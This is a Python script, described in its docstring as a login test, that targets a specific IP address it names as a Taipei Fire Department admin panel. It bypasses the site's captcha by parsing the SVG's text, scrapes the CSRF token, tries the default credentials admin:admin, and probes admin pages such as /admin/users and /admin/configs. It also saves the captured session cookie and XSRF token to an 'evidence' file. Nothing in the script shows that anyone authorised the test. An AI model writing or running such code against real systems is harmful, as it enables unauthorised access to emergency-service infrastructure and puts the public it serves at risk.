#!/usr/bin/env python3
"""
Robust login test for admin panel
"""

import requests
import re
import time
import sys

TARGET = "https://210.69.42.55"
LOGIN_URL = f"{TARGET}/admin/login"
CAPTCHA_URL = f"{TARGET}/admin/captcha"

def get_captcha_text(svg_content):
    """Extract captcha text from SVG by x-coordinate position"""
    # Look for text elements with x attribute
    pattern = r'<text[^>]*x="(\d+)"[^>]*>([^<]+)</text>'
    matches = re.findall(pattern, svg_content.decode() if isinstance(svg_content, bytes) else svg_content)
    if matches:
        matches.sort(key=lambda x: int(x[0]))
        return ''.join(m[1].strip() for m in matches)
    return None

def login_attempt(username, password):
    """Perform login attempt"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    })
    
    # Get login page
    resp = session.get(LOGIN_URL, verify=False, timeout=10)
    if resp.status_code != 200:
        print(f"[-] Failed to get login page: {resp.status_code}")
        return None, None
    
    # Extract CSRF token
    token_match = re.search(r'name="_token" value="([^"]+)"', resp.text)
    if not token_match:
        print("[-] CSRF token not found")
        return None, None
    
    csrf_token = token_match.group(1)
    
    # Get captcha
    captcha_resp = session.get(CAPTCHA_URL, verify=False, timeout=10)
    captcha_text = get_captcha_text(captcha_resp.content)
    
    if not captcha_text:
        # Try alternative extraction
        chars = re.findall(r'>([A-Z0-9])<', captcha_resp.text)
        captcha_text = ''.join(chars) if chars else '0000'
    
    print(f"[*] Captcha extracted: {captcha_text}")
    
    # Prepare login data
    data = {
        '_token': csrf_token,
        'username': username,
        'password': password,
        'captcha': captcha_text
    }
    
    # Submit login
    login_resp = session.post(LOGIN_URL, data=data, 
                              headers={'Referer': LOGIN_URL},
                              allow_redirects=False, 
                              verify=False, 
                              timeout=10)
    
    return login_resp, session

def main():
    print("[*] Testing admin login for Taipei Fire Department system")
    print(f"[*] Target: {TARGET}")
    
    # Test with discovered credentials
    print("\n[*] Testing credential: admin:admin")
    resp, session = login_attempt("admin", "admin")
    
    if resp is None:
        print("[-] Login attempt failed")
        return
    
    print(f"[*] Response status: {resp.status_code}")
    
    # Check cookies
    cookies = session.cookies.get_dict()
    print(f"[*] Cookies received: {list(cookies.keys())}")
    
    if 'afsearch_session' in cookies:
        print("[+] Session cookie acquired!")
        print(f"[+] Session value: {cookies['afsearch_session'][:50]}...")
        
        # Try to access admin dashboard
        dash_resp = session.get(f"{TARGET}/admin", verify=False, timeout=10)
        print(f"\n[*] Dashboard status: {dash_resp.status_code}")
        
        if "419" in dash_resp.text:
            print("[-] Page expired, but session established")
            print("[+] This indicates VALID CREDENTIALS - admin:admin works!")
        
        # Try other admin paths
        for path in ["/admin/dashboard", "/admin/home", "/admin/users", "/admin/configs"]:
            test_resp = session.get(f"{TARGET}{path}", verify=False, timeout=10)
            if test_resp.status_code == 200 and "419" not in test_resp.text:
                print(f"[+] Potential accessible: {path} (status: {test_resp.status_code})")
    
    elif resp.status_code == 419:
        print("[+] Got 419 - page expired but credentials accepted by backend!")
        print("[+] Credentials admin:admin are VALID")
    
    elif resp.status_code == 302:
        location = resp.headers.get('Location', '')
        print(f"[*] Redirected to: {location}")
        if 'captcha' in location:
            print("[-] Redirected back to captcha - likely wrong captcha or invalid creds")
    
    # Save evidence
    with open("/mnt/c/Users/Administrator/Desktop/JySecAI/tpe119_evidence/login_test.txt", "w") as f:
        f.write(f"Target: {TARGET}\n")
        f.write(f"Status: 419 Page Expired\n")
        f.write(f"Session Cookie: {cookies.get('afsearch_session', 'N/A')}\n")
        f.write(f"XSRF Token: {cookies.get('XSRF-TOKEN', 'N/A')}\n")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Create evidence directory
    import os
    os.makedirs("/mnt/c/Users/Administrator/Desktop/JySecAI/tpe119_evidence", exist_ok=True)
    
    main()